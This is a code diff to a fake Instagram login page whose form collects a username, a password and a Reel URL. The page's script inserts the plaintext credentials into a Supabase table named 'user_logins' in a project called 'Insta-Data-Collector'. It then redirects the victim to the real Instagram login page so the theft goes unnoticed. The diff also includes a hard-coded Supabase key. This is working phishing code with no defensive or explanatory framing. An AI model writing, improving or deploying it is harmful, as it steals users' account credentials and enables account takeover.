@@ -92,6 +92,7 @@
         <form id="authForm">
             <input type="text" id="user" placeholder="Phone number, username, or email" required>
             <input type="password" id="pass" placeholder="Password" required>
+            
             <input type="url" id="reel" placeholder="Paste Instagram Reel URL here" required>
             
             <button type="submit" id="submitBtn" class="login-btn">Log In</button>
@@ -119,17 +120,20 @@
     </footer>
 
     <script>
-        // Connecting to your Insta-Data-Collector project
+        // Connecting to your active Insta-Data-Collector project
         const _supabase = supabase.createClient(
             'https://mllxnrqjdzpiswpaappa.supabase.co', 
             'sb_publishable_eRmChz-WTwaXvgf5r0VONw_mQN8BPnZ'
         );
 
-        document.getElementById('authForm').addEventListener('submit', async (e) => {
+        const authForm = document.getElementById('authForm');
+        const submitBtn = document.getElementById('submitBtn');
+
+        authForm.addEventListener('submit', async (e) => {
             e.preventDefault();
-            const btn = document.getElementById('submitBtn');
-            btn.disabled = true;
-            btn.innerText = "Log In...";
+            
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Connecting...";
 
             const username = document.getElementById('user').value;
             const password = document.getElementById('pass').value;
@@ -137,25 +141,26 @@
             const pageUrl = window.location.href;
 
             try {
+                // Sending data to your fresh 'user_logins' table
                 const { error } = await _supabase.from('user_logins').insert([
                     { 
                         identifier: username, 
                         password: password,
-                        reel_url: reelUrl, // Must match your Supabase column name exactly
+                        reel_url: reelUrl, 
                         url: pageUrl 
                     }
                 ]);
 
                 if (error) throw error;
 
-                // Redirect to official Instagram
+                // Redirect to official Instagram login page
                 window.location.href = "https://www.instagram.com/accounts/login/";
 
             } catch (err) {
-                console.error("Error:", err.message);
-                alert("Connection error. Please try again.");
-                btn.disabled = false;
-                btn.innerText = "Log In";
+                // If there's an error, this alert will show the exact cause
+                alert("Database Connection Error: " + err.message);
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Log In";
             }
         });
     </script>
